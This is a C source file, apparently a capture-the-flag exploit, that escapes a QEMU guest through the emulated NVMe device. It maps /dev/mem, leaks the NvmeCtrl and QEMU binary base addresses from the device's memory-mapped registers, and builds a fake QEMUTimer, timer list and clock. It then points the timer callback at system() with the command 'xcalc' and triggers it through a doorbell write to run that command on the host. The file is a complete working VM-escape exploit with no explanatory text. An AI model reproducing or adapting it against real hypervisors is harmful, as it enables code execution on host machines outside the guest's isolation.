/*
 * author: luckasdf0
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/ioctl.h>
#include <linux/hdreg.h>
#include <errno.h>

#define NVME_BAR_BASE 0xdead0000
#define NVME_MMIO_BASE 0x00000000febf0000

void hexdump(uint8_t *mem, size_t len) {
    for (size_t i = 1; i <= len; i++) {
        printf("%02x ", mem[i-1]);
        if (i % 16 == 0)
            printf("\n");
        else if (i % 8 == 0)
            printf("  ");
    }
}

int main(int argc, char const* argv[]) {
    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (devmem_fd < 0) {
        perror("open /dev/mem");
        _exit(-1);
    }

    if (!mmap((void *)NVME_BAR_BASE, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, NVME_MMIO_BASE)) {
        perror("map mmio");
        _exit(-1);
    }

    uint64_t nvme_addr = *((uint64_t *)(NVME_BAR_BASE+0x170))-0xe0-0xac0;
    uint64_t nvme_bar = nvme_addr+0xac0;
    uint64_t elf_base = *((uint64_t *)(NVME_BAR_BASE+0x11c0))-0x760b44;

    printf("NVMECtrl 0x%016lx\n", nvme_addr);
    printf("ELF Base 0x%016lx\n", elf_base);

    fflush(stdout);

    uint64_t target_addr = nvme_bar+0x1000-0x10;

    // overwrite NvmeCtrl->sq[0].timer. point to fake QEMUTimer
    *((uint64_t *)(NVME_BAR_BASE+0x100)) = nvme_bar+0xf00;

    // fake QEMUTimer
    *((uint64_t *)(NVME_BAR_BASE+0xf00)) = 0;
    *((uint64_t *)(NVME_BAR_BASE+0xf08)) = nvme_bar+0xf40; // fake timerlist
    *((uint64_t *)(NVME_BAR_BASE+0xf20)) = 0;
    *((uint64_t *)(NVME_BAR_BASE+0xf28)) = 0x000f424000000000;

    // fake QEMUTimerList
    *((uint64_t *)(NVME_BAR_BASE+0xf40)) = nvme_bar+0xf30-0x18;     // fake QEMUClock
    *((uint64_t *)(NVME_BAR_BASE+0xf40+0x38)) = 0x0000000100000000;
    *((uint64_t *)(NVME_BAR_BASE+0xf40+0x40)) = nvme_bar+0xf00;
    *((uint64_t *)(NVME_BAR_BASE+0xf40+0x48)) = 0;
    *((uint64_t *)(NVME_BAR_BASE+0xf40+0x50)) = 0;
    *((uint64_t *)(NVME_BAR_BASE+0xf40+0x58)) = elf_base+0x2BC600;  // system
    *((uint64_t *)(NVME_BAR_BASE+0xf40+0x60)) = nvme_bar+0xfc0;     // cmd
    *((uint64_t *)(NVME_BAR_BASE+0xf40+0x68)) = 0x0000000100000000;

    // fake QEMUClock
    *((uint64_t *)(NVME_BAR_BASE+0xf30)) = 0x0;

    strcpy(NVME_BAR_BASE+0xfc0, "xcalc");
    //strcpy(NVME_BAR_BASE+0xfc0, "google-chrome –no-sandbox file:///home/qwb/Desktop/success.mp4");

    *((uint64_t *)(NVME_BAR_BASE+0x1000)) = 0x41; // trigger timer_mod in nvme_process_db

    return 0;
}
